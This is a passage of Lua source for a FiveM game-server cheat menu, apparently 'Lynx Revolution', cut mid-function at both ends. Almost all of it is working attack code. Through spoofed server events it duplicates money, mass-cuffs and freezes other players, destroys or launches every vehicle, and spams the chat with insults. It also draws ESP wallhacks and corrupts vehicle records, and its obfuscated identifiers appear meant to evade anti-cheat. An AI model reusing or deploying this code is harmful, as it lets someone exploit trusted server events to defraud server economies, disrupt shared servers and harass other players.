              Citizen.InvokeNative( 0x63BB75ABEDC1F6A0, headId, 0, Pryorbypessed2 )
            end
            if showblip then

              if not DoesBlipExist( blip ) then
                blip = AddBlipForEntity( ped )
                SetBlipSprite( blip, 1 )
                Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed3 )
                SetBlipNameToPlayerName(blip, id)

              else

                veh = GetVehiclePedIsIn( ped, Pryorbypessed2 )
                blipSprite = GetBlipSprite( blip )

                if not GetEntityHealth( ped ) then

                  if blipSprite ~= 274 then

                    SetBlipSprite( blip, 274 )
                    Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                    SetBlipNameToPlayerName(blip, id)

                  end

                elseif veh then

                  vehClass = GetVehicleClass( veh )
                  vehModel = GetEntityModel( veh )

                  if vehClass == 15 then

                    if blipSprite ~= 422 then

                      SetBlipSprite( blip, 422 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                      SetBlipNameToPlayerName(blip, id)

                    end

                  elseif vehClass == 16 then

                    if vehModel == GetHashKey( "besra" ) or vehModel == GetHashKey( "hydra" )
                    or vehModel == GetHashKey( "lazer" ) then

                      if blipSprite ~= 424 then

                        SetBlipSprite( blip, 424 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                        SetBlipNameToPlayerName(blip, id)

                      end

                    elseif blipSprite ~= 423 then

                      SetBlipSprite( blip, 423 )
                      Citizen.InvokeNative (0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                    end
                  elseif vehClass == 14 then
                    if blipSprite ~= 427 then
                      SetBlipSprite( blip, 427 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                    end
                  elseif vehModel == GetHashKey( "insurgent" ) or vehModel == GetHashKey( "insurgent2" )
                    or vehModel == GetHashKey( "limo2" ) then
                      if blipSprite ~= 426 then
                        SetBlipSprite( blip, 426 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif vehModel == GetHashKey( "rhino" ) then
                      if blipSprite ~= 421 then
                        SetBlipSprite( blip, 421 )
                        Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed2 )
                        SetBlipNameToPlayerName(blip, id)
                      end
                    elseif blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed3 )
                      SetBlipNameToPlayerName(blip, id)
                    end
                    passengers = GetVehicleNumberOfPassengers( veh )
                    if passengers then
                      if not IsVehicleSeatFree( veh, -1 ) then
                        passengers = passengers + 1
                      end
                      ShowNumberOnBlip( blip, passengers )
                    else
                      HideNumberOnBlip( blip )
                    end
                  else
                    HideNumberOnBlip( blip )
                    if blipSprite ~= 1 then
                      SetBlipSprite( blip, 1 )
                      Citizen.InvokeNative( 0x5FBCA48327B914DF, blip, Pryorbypessed3 )
                      SetBlipNameToPlayerName(blip, id)
                    end
                  end
                  SetBlipRotation( blip, math.ceil( GetEntityHeading( veh ) ) ) -- update rotation
                  SetBlipNameToPlayerName( blip, id )
                  SetBlipScale( blip,  0.85 )
                  if IsPauseMenuActive() then
                    SetBlipAlpha( blip, 255 )
                  else
                    x1, y1 = table.unpack( GetEntityCoords( GetPlayerPed( -1 ), Pryorbypessed3 ) )
                    x2, y2 = table.unpack( GetEntityCoords( GetPlayerPed( id ), Pryorbypessed3 ) )
                    distance = ( math.floor( math.abs( math.sqrt( ( x1 - x2 ) * ( x1 - x2 ) + ( y1 - y2 ) * ( y1 - y2 ) ) ) / -1 ) ) + 900
                    if distance < 0 then
                      distance = 0
                    elseif distance > 255 then
                      distance = 255
                    end
                    SetBlipAlpha( blip, distance )
                  end
                end
              else
                RemoveBlip(blip)
              end
            end
          end
        end
        end)

        local entityEnumerator = {
          __gc = function(enum)
          if enum.destructor and enum.handle then
            enum.destructor(enum.handle)
          end
          enum.destructor = Pryorbypessed
          enum.handle = Pryorbypessed
        end
      }

      function EnumerateEntities(initFunc, moveFunc, disposeFunc)
        return coroutine.wrap(function()
        local iter, id = initFunc()
        if not id or id == 0 then
          disposeFunc(iter)
          return
        end

        local enum = {handle = iter, destructor = disposeFunc}
        setmetatable(enum, entityEnumerator)

        local next = Pryorbypessed3
        repeat
          coroutine.yield(id)
          next, id = moveFunc(iter)
        until not next

        enum.destructor, enum.handle = Pryorbypessed, Pryorbypessed
        disposeFunc(iter)
        end)
      end

      function EnumeratePeds()
        return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
      end

      function EnumerateVehicles()
        return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
      end

      function EnumerateObjects()
        return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
      end

      function RotationToDirection(rotation)
        local retz = rotation.z * 0.0174532924
        local retx = rotation.x * 0.0174532924
        local absx = math.abs(math.cos(retx))

        return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
      end

      function OscillateEntity(entity, entityCoords, position, angleFreq, dampRatio)
        if entity ~= 0 and entity ~= Pryorbypessed then
          local direction = ((position - entityCoords) * (angleFreq * angleFreq)) - (2.0 * angleFreq * dampRatio * GetEntityVelocity(entity))
          ApplyForceToEntity(entity, 3, direction.x, direction.y, direction.z + 0.1, 0.0, 0.0, 0.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2, Pryorbypessed3)
        end
      end

      local invisible = Pryorbypessed3

      Citizen.CreateThread(
      function()
        while Enabled do
          Citizen.Wait(0)

          SetPlayerInvincible(PlayerId(), Godmode)
          SetEntityInvincible(PlayerPedId(-1), Godmode)
          SetEntityVisible(GetPlayerPed(-1), invisible, 0)

          if SuperJump then
            SetSuperJumpThisFrame(PlayerId(-1))
          end

          if InfStamina then
            RestorePlayerStamina(PlayerId(-1), 1.0)
          end

          if fastrun then
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 2.49)
            SetPedMoveRateOverride(GetPlayerPed(-1), 2.15)
          else
            SetRunSprintMultiplierForPlayer(PlayerId(-1), 1.0)
            SetPedMoveRateOverride(GetPlayerPed(-1), 1.0)
          end

          if VehicleGun then
            local VehicleGunVehicle = "Freight"
            local playerPedPos = GetEntityCoords(GetPlayerPed(-1), Pryorbypessed3)
            if (IsPedInAnyVehicle(GetPlayerPed(-1), Pryorbypessed3) == Pryorbypessed2) then
              notify("~g~Vehicle Gun Ativado!~n~~w~Use a ~b~AP Pistol~n~~b~Aim ~w~and ~b~Shoot!", Pryorbypessed2)
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999, Pryorbypessed2, Pryorbypessed3)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey("WEAPON_APPISTOL"), 999999)
              if (GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey("WEAPON_APPISTOL")) then
                if IsPedShooting(GetPlayerPed(-1)) then
                  while not HasModelLoaded(GetHashKey(VehicleGunVehicle)) do
                    Citizen.Wait(0)
                    RequestModel(GetHashKey(VehicleGunVehicle))
                  end
                  local veh = CreateVehicle(GetHashKey(VehicleGunVehicle), playerPedPos.x + (5 * GetEntityForwardX(GetPlayerPed(-1))), playerPedPos.y + (5 * GetEntityForwardY(GetPlayerPed(-1))), playerPedPos.z + 2.0, GetEntityHeading(GetPlayerPed(-1)), Pryorbypessed3, Pryorbypessed3)
                  SetEntityAsNoLongerNeeded(veh)
                  SetVehicleForwardSpeed(veh, 150.0)
                end
              end
            end
          end

          if DeleteGun then
            local cB = getEntity(PlayerId(-1))
            if IsPedInAnyVehicle(GetPlayerPed(-1), Pryorbypessed3) == Pryorbypessed2 then
              notify(
              '~g~Delete Gun Enabled!~n~~w~Use The ~b~Pistol~n~~b~Aim ~w~and ~b~Shoot ~w~To Delete!'
              )
              GiveWeaponToPed(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999, Pryorbypessed2, Pryorbypessed3)
              SetPedAmmo(GetPlayerPed(-1), GetHashKey('WEAPON_PISTOL'), 999999)
              if GetSelectedPedWeapon(GetPlayerPed(-1)) == GetHashKey('WEAPON_PISTOL') then
                if IsPlayerFreeAiming(PlayerId(-1)) then
                  if IsEntityAPed(cB) then
                    if IsPedInAnyVehicle(cB, Pryorbypessed3) then
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(GetVehiclePedIsIn(cB, Pryorbypessed3), 1, 1)
                        DeleteEntity(GetVehiclePedIsIn(cB, Pryorbypessed3))
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Deleted!')
                      end
                    else
                      if IsControlJustReleased(1, 142) then
                        SetEntityAsMissionEntity(cB, 1, 1)
                        DeleteEntity(cB)
                        notify('~g~Deleted!')
                      end
                    end
                  else
                    if IsControlJustReleased(1, 142) then
                      SetEntityAsMissionEntity(cB, 1, 1)
                      DeleteEntity(cB)
                      notify('~g~Deleted!')
                    end
                  end
                end
              end
            end
          end

if felipebypassedmesquita == Pryorbypessed then
  print('Lynx FTW')
  SetGamePaused(Pryorbypessed3)
end

if freezeall then
  for i = 0, 128 do
      Pryorbypessed1("OG_cuffs:cuffCheckNearest", GetPlayerServerId(i))
      Pryorbypessed1("CheckHandcuff", GetPlayerServerId(i))
      Pryorbypessed1("cuffServer", GetPlayerServerId(i))
      Pryorbypessed1("cuffGranted", GetPlayerServerId(i))
      Pryorbypessed1("police:cuffGranted", GetPlayerServerId(i))
      Pryorbypessed1("esx_handcuffs:cuffing", GetPlayerServerId(i))
      Pryorbypessed1("esx_policejob:handcuff", GetPlayerServerId(i))
    end
  end

          if fuckallcars then
            for playerVeh in EnumerateVehicles() do
              if (not IsPedAPlayer(GetPedInVehicleSeat(playerVeh, -1))) then
                SetVehicleHasBeenOwnedByPlayer(playerVeh, Pryorbypessed2)
                SetEntityAsMissionEntity(playerVeh, Pryorbypessed3, Pryorbypessed3)
                StartVehicleAlarm(playerVeh)
                DetachVehicleWindscreen(playerVeh)
                SmashVehicleWindow(playerVeh, 0)
                SmashVehicleWindow(playerVeh, 1)
                SmashVehicleWindow(playerVeh, 2)
                SmashVehicleWindow(playerVeh, 3)
                SetVehicleTyreBurst(playerVeh, 0, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 1, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 2, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 3, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 5, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 4, Pryorbypessed3, 1000.0)
                SetVehicleTyreBurst(playerVeh, 7, Pryorbypessed3, 1000.0)
                SetVehicleDoorBroken(playerVeh, 0, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 1, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 2, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 3, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 4, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 5, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 6, Pryorbypessed3)
                SetVehicleDoorBroken(playerVeh, 7, Pryorbypessed3)
                SetVehicleLights(playerVeh, 1)
                Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
                SetVehicleNumberPlateTextIndex(playerVeh, 5)
                SetVehicleNumberPlateText(playerVeh, "67cnj087")
                SetVehicleDirtLevel(playerVeh, 10.0)
                SetVehicleModColor_1(playerVeh, 1)
                SetVehicleModColor_2(playerVeh, 1)
                SetVehicleCustomPrimaryColour(playerVeh, 255, 51, 255)
                SetVehicleCustomSecondaryColour(playerVeh, 255, 51, 255)
                SetVehicleBurnout(playerVeh, Pryorbypessed3)
              end
            end
          end

		  if cardz then
			local pbase = GetActivePlayers()
			for i = 1, #pbase do
				if IsPedInAnyVehicle(GetPlayerPed(pbase[i]), Pryorbypessed3) then
					ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
				end
			end
		end

		if gundz then
			local pbase = GetActivePlayers()
			for i = 1, #pbase do
				if i == PlayerPedId(-1) then i=i+1 end
				if IsPedShooting(GetPlayerPed(pbase[i])) then
					ClearPedTasksImmediately(GetPlayerPed(pbase[i]))
				end
			end
		end

          if destroyvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2)) then
                NetworkRequestControlOfEntity(vehicle)
                SetVehicleUndriveable(vehicle,Pryorbypessed3)
                SetVehicleEngineHealth(vehicle, 0)
              end
            end
          end

          if alarmvehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2)) then
				NetworkRequestControlOfEntity(vehicle)
				SetVehicleAlarmTimeLeft(vehicle, 500)
                SetVehicleAlarm(vehicle,Pryorbypessed3)
                StartVehicleAlarm(vehicle)
              end
            end
		  end
		  
		  if lolcars then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end

    if lolcarsww then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 4, 0.0, 0.0, 10000000.0, 1.0, 1.0, 1.0, 1, 1, 1, 1, 1, 1)
			end
		end

    if lolcarszz then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 3, 0.0, 0.0, -500000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end

    if lolcarsaa then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 1, 5000.0, 0.0, 0.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end

    if lolcars44 then
			for vehicle in EnumerateVehicles() do
				RequestControlOnce(vehicle)
				ApplyForceToEntity(vehicle, 4, 0.0, 0.0, -50000.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
			end
		end
    
    if JumpMod and IsPedInAnyVehicle(GetPlayerPed(-1), Pryorbypessed3) then 
      if IsControlJustPressed(1, 22) then
      notify("~g~Espaço Para Pular")
      local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
      ApplyForceToEntity(veh, 3, 0.0, 0.0, 9.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
      end
    
    end
    
    if FireBreath and not IsPedInAnyVehicle(GetPlayerPed(-1), Pryorbypessed2) then
   
      notify("🔥~w~Aperte ~r~2 ~w~Para Soltar Fogo!🔥")
      if IsControlPressed(1, 158) then
        RequestNamedPtfxAsset("core")
      UseParticleFxAssetNextCall("core")
      StartNetworkedParticleFxNonLoopedOnEntity("ent_sht_flame", GetPlayerPed(-1), 0.0, 0.350, 0.6, 0.0, 90.0, 90.0, 1.0, Pryorbypessed2, Pryorbypessed2, Pryorbypessed2)
      end
    end
    
    if BecomeTiny then
      SetPedConfigFlag(PlayerPedId(), 223, Pryorbypessed3)
    else
      SetPedConfigFlag(PlayerPedId(), 223, Pryorbypessed2)
    end

    DisplayRadar(ForceRadar, 1)

    if IsControlJustPressed(1, 164) then
          TeleportToWaypoint()
    end 

    if IsControlJustPressed(1, 157) then
    repairvehicle()
    end

    if LynxIcZ ~= "Lynx ~u~Revolution" then
      ForceSocialClubUpdate()
    end


          if explodevehicles then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2)) then
                NetworkRequestControlOfEntity(vehicle)
                NetworkExplodeVehicle(vehicle, Pryorbypessed3, Pryorbypessed3, Pryorbypessed2)
              end
            end
          end

          if huntspam then
            Citizen.Wait(1)
            TSE('esx-qalle-hunting:reward', 20000)
            TSE('esx-qalle-hunting:sell')
          end

          if deletenearestvehicle then
            for vehicle in EnumerateVehicles() do
              if (vehicle ~= GetVehiclePedIsIn(GetPlayerPed(-1), Pryorbypessed2)) then
                SetEntityAsMissionEntity(GetVehiclePedIsIn(vehicle, Pryorbypessed3), 1, 1)
                DeleteEntity(GetVehiclePedIsIn(vehicle, Pryorbypessed3))
                SetEntityAsMissionEntity(vehicle, 1, 1)
                DeleteEntity(vehicle)
              end
            end
          end

          if esp then
            for i=1,128 do
              if  ((NetworkIsPlayerActive( i )) and GetPlayerPed( i ) ~= GetPlayerPed( -1 )) then
                local ra = RGB(1.0)
                local pPed = GetPlayerPed(i)
                local cx, cy, cz = table.unpack(GetEntityCoords(PlayerPedId(-1)))
                local x, y, z = table.unpack(GetEntityCoords(pPed))
                local disPlayerNames = 130
                local disPlayerNamesz = 999999
                  if nameabove then
                    distance = math.floor(GetDistanceBetweenCoords(cx,  cy,  cz,  x,  y,  z,  Pryorbypessed3))
                      if ((distance < disPlayerNames)) then
                        if NetworkIsPlayerTalking( i ) then
                          DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), ra.r,ra.g,ra.b)
                        else
                          DrawText3D(x, y, z+1.2, GetPlayerServerId(i).."  |  "..GetPlayerName(i), 255,255,255)
                        end
                      end
                  end
                local message =
                "Name: " ..
                GetPlayerName(i) ..
                "\nServer ID: " ..
                GetPlayerServerId(i) ..
                "\nPlayer ID: " .. i .. "\nDist: " .. math.round(GetDistanceBetweenCoords(cx, cy, cz, x, y, z, Pryorbypessed3), 1)
                if IsPedInAnyVehicle(pPed, Pryorbypessed3) then
				         local VehName = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(pPed))))
                  message = message .. "\nVeh: " .. VehName
                end
                if ((distance < disPlayerNamesz)) then
                if espinfo and esp then
                  DrawText3D(x, y, z - 1.0, message, ra.r, ra.g, ra.b)
                end
                if espbox and esp then
                  LineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                  LineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                  LineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)
                  LineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  LineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  LineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                  LineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)

                  TLineOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                  TLineOneEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  TLineTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  TLineTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  TLineThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  TLineThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                  TLineFourBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)

                  ConnectorOneBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, 0.8)
                  ConnectorOneEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, 0.3, -0.9)
                  ConnectorTwoBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, 0.8)
                  ConnectorTwoEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, 0.3, -0.9)
                  ConnectorThreeBegin = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, 0.8)
                  ConnectorThreeEnd = GetOffsetFromEntityInWorldCoords(pPed, -0.3, -0.3, -0.9)
                  ConnectorFourBegin = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, 0.8)
                  ConnectorFourEnd = GetOffsetFromEntityInWorldCoords(pPed, 0.3, -0.3, -0.9)

                  DrawLine(
                  LineOneBegin.x,
                  LineOneBegin.y,
                  LineOneBegin.z,
                  LineOneEnd.x,
                  LineOneEnd.y,
                  LineOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  LineTwoBegin.x,
                  LineTwoBegin.y,
                  LineTwoBegin.z,
                  LineTwoEnd.x,
                  LineTwoEnd.y,
                  LineTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  LineThreeBegin.x,
                  LineThreeBegin.y,
                  LineThreeBegin.z,
                  LineThreeEnd.x,
                  LineThreeEnd.y,
                  LineThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  LineThreeEnd.x,
                  LineThreeEnd.y,
                  LineThreeEnd.z,
                  LineFourBegin.x,
                  LineFourBegin.y,
                  LineFourBegin.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineOneBegin.x,
                  TLineOneBegin.y,
                  TLineOneBegin.z,
                  TLineOneEnd.x,
                  TLineOneEnd.y,
                  TLineOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineTwoBegin.x,
                  TLineTwoBegin.y,
                  TLineTwoBegin.z,
                  TLineTwoEnd.x,
                  TLineTwoEnd.y,
                  TLineTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineThreeBegin.x,
                  TLineThreeBegin.y,
                  TLineThreeBegin.z,
                  TLineThreeEnd.x,
                  TLineThreeEnd.y,
                  TLineThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  TLineThreeEnd.x,
                  TLineThreeEnd.y,
                  TLineThreeEnd.z,
                  TLineFourBegin.x,
                  TLineFourBegin.y,
                  TLineFourBegin.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorOneBegin.x,
                  ConnectorOneBegin.y,
                  ConnectorOneBegin.z,
                  ConnectorOneEnd.x,
                  ConnectorOneEnd.y,
                  ConnectorOneEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorTwoBegin.x,
                  ConnectorTwoBegin.y,
                  ConnectorTwoBegin.z,
                  ConnectorTwoEnd.x,
                  ConnectorTwoEnd.y,
                  ConnectorTwoEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorThreeBegin.x,
                  ConnectorThreeBegin.y,
                  ConnectorThreeBegin.z,
                  ConnectorThreeEnd.x,
                  ConnectorThreeEnd.y,
                  ConnectorThreeEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                  DrawLine(
                  ConnectorFourBegin.x,
                  ConnectorFourBegin.y,
                  ConnectorFourBegin.z,
                  ConnectorFourEnd.x,
                  ConnectorFourEnd.y,
                  ConnectorFourEnd.z,
                  ra.r,
                  ra.g,
                  ra.b,
                  255
                  )
                end
                if esplines and esp then
                  DrawLine(cx, cy, cz, x, y, z, ra.r, ra.g, ra.b, 255)
                end
              end
            end
          end
          end

          if VehGod and IsPedInAnyVehicle(PlayerPedId(-1), Pryorbypessed3) then
            SetEntityInvincible(GetVehiclePedIsUsing(PlayerPedId(-1)), Pryorbypessed3)
          end

          if waterp and IsPedInAnyVehicle(PlayerPedId(-1), Pryorbypessed3) then
            SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), Pryorbypessed3, Pryorbypessed3, Pryorbypessed3)
          end

          if oneshot then
            SetPlayerWeaponDamageModifier(PlayerId(-1), 100.0)
            local gotEntity = getEntity(PlayerId(-1))
            if IsEntityAPed(gotEntity) then
              if IsPedInAnyVehicle(gotEntity, Pryorbypessed3) then
                if IsPedInAnyVehicle(GetPlayerPed(-1), Pryorbypessed3) then
                  if IsControlJustReleased(1, 69) then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, Pryorbypessed3), Pryorbypessed3, Pryorbypessed3, 0)
                  end
                else
                  if IsControlJustReleased(1, 142) and oneshotcar then
                    NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, Pryorbypessed3), Pryorbypessed3, Pryorbypessed3, 0)
                  end
                end
              end
            end
          else
            SetPlayerWeaponDamageModifier(PlayerId(-1), 1.0)
          end

          if crosshair then
            ShowHudComponentThisFrame(14)
          end

          if crosshairc then
            DrawTxt("~r~+", 0.495, 0.484)
          end

          if crosshairc2 then
            DrawTxt("~r~.", 0.4968, 0.478)
          end

          if dio then
            DoJesusTick(JesusRadius)
          end


          if showCoords then
            x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(-1), Pryorbypessed3))
            roundx = tonumber(string.format("%.2f", x))
            roundy = tonumber(string.format("%.2f", y))
            roundz = tonumber(string.format("%.2f", z))

            DrawTxt("~r~X:~s~ "..roundx, 0.05, 0.00)
            DrawTxt("~r~Y:~s~ "..roundy, 0.13, 0.00)
            DrawTxt("~r~Z:~s~ "..roundz, 0.20, 0.00)
          end



         function automaticmoneyesx()
            local result = Pryyyorbypass("Warning, this value can be multiplied!!!", "", 100)
              if result ~= "" then
                local confirm = Pryyyorbypass("Are you sure? y/n", "", 0)
                if confirm == "y" then
                notify("~g~Testing all ~y~ESX ~g~scripts~s~.", Pryorbypessed3)
                TSE("esx_carthief:pay", result)
                TSE("esx_jobs:caution", "give_back", result)
                TSE("esx_fueldelivery:pay", result)
                TSE("esx_carthief:pay", result)
                TSE("esx_godirtyjob:pay", result)
                TSE("esx_pizza:pay", result)
                TSE("esx_ranger:pay", result)
                TSE("esx_garbagejob:pay", result)
                TSE("esx_truckerjob:pay", result)
                TSE("AdminMenu:giveBank", result)
                TSE("AdminMenu:giveCash", result)
                TSE("esx_gopostaljob:pay", result)
                TSE("esx_banksecurity:pay", result)
                TSE("esx_slotmachine:sv:2", result)
              elseif confirm == "n" then
                notify("~b~Operation cancelled~s~.", Pryorbypessed2)
              else
                notify("~b~Invalid Confirmation~s~.", Pryorbypessed3)
                notify("~b~Operation cancelled~s~.", Pryorbypessed2)
              end
            end
          end

        function vrpdestroy()
            for c = 0, 9 do
				TSE("_chat:messageEntered", "^1L^2y^3n^4x ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n ^110", { 141, 211, 255 }, "^"..c.."❤Use com moderação❤... Pega nada ADM!! - Hello GAYS!")
            end
            TSE("lscustoms:payGarage", {costs = -99999999})
            TSE("vrp_slotmachine:server:2",999999999)
			TSE("bank:deposit", 999999999)
			for i=0,1000 do
			TSE('paycheck:bonus')
			TSE('paycheck:salary')
			end
			local q = 99999
			for k= 1,3000 do
			TSE("bank:transfer", k, q)
            end
          end

		  if vrpdbc then
			for i=0,10 do
				for veh in EnumerateVehicles() do
					Citizen.InvokeNative(0xAD738C3085FE7E11, veh, Pryorbypessed3, Pryorbypessed3)
					 
					if DoesEntityExist(veh) then
					local colors = "asdrubale"
					local extra_colors = "asdrubale"
					local neoncolor = "asdrubale"
					local mods = "asdrubale"
					local smokecolor = "asdrubale"
					local plate = math.random(1,999999)
					local plateindex = "asdrubale"
					local primarycolor = "asdrubale"
					local secondarycolor = "asdrubale"
					local pearlescentcolor = "asdrubale"
					local wheelcolor = "asdrubale"
					local neoncolor1 = "asdrubale"
					local neoncolor2 = "asdrubale"
					local neoncolor3 = "asdrubale"
					local windowtint = "asdrubale"
					local wheeltype = "asdrubale"
					local smokecolor1 = "asdrubale"
					local smokecolor2 = "asdrubale"
					local smokecolor3 = "asdrubale"
					local mods0 = "asdrubale"
					local mods1 = "asdrubale"
					local mods2 = "asdrubale"
					local mods3 = "asdrubale"
					local mods4 = "asdrubale"
					local mods5 = "asdrubale"
					local mods6 = "asdrubale"
					local mods7 = "asdrubale"
					local mods8 = "asdrubale"
					local mods9 = "asdrubale"
					local mods10 ="asdrubale"
					local mods11 = "asdrubale"
					local mods12 = "asdrubale"
					local mods13 = "asdrubale"
					local mods14 = "asdrubale"
					local mods15 = "asdrubale"
					local mods16 = "asdrubale"
					local mods23 = "asdrubale"
					local mods24 = "asdrubale"
					local turbo = "asdrubale"
					local tiresmoke = "asdrubale"
					local xenon = "asdrubale"
					local neon1 = "asdrubale"
					local neon2 = "asdrubale"
					local neon3 = "asdrubale"
					local bulletproof = "asdrubale"
					local variation = "asdrubale"
					Pryorbypessed1('lscustoms:UpdateVeh', vehicle, plate, plateindex,primarycolor,secondarycolor,pearlescentcolor,wheelcolor,neoncolor1,neoncolor2,neoncolor3,windowtint,wheeltype,mods0,mods1,mods2,mods3,mods4,mods5,mods6,mods7,mods8,mods9,mods10,mods11,mods12,mods13,mods14,mods15,mods16,turbo,tiresmoke,xenon,mods23,mods24,neon0,neon1,neon2,neon3,bulletproof,smokecolor1,smokecolor2,smokecolor3,variation)
					end
				end
			end
		  end

if gcphonedestroy then
	local numBase0 = math.random(100,999)
	local numBase1 = math.random(0,9999)
	local num = string.format("%03d-%04d", numBase0, numBase1 )
	local num2 = string.format("%03d-%04d", numBase0, numBase1 )
	local transmitter = num
	local receiver = num2
